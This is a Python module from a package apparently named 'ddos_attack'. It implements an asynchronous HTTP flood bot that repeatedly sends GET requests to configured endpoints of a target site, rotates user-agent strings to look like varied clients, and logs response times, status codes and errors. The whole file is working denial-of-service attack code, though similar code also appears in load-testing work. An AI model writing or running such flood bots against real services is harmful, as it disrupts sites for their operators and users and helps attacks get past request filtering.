import time
import asyncio
from ddos_attack.utils import random_choice, load_config

ddos_config = load_config("ddos.json")
TARGET = ddos_config["l7"]["TARGET"]
ENDPOINTS = ddos_config["l7"]["ENDPOINTS"]
USER_AGENTS = ddos_config["l7"]["USER_AGENTS"]

async def l7_bot(name, session, limiter, stats, stop_time):
    while time.time() < stop_time:
        await limiter.acquire()
        endpoint = random_choice(ENDPOINTS)
        headers = {"User-Agent": random_choice(USER_AGENTS)}
        start = time.time()
        try:
            async with session.get(TARGET + endpoint, headers=headers, timeout=10) as resp:
                text = await resp.text()  # krótkie użycie odpowiedzi
                response_time = (time.time() - start) * 1000.0
                stats['response_times'].append(response_time)
                stats['http_codes'].append(resp.status)
        except Exception as e:
            stats['errors_count'] += 1
        await asyncio.sleep(0)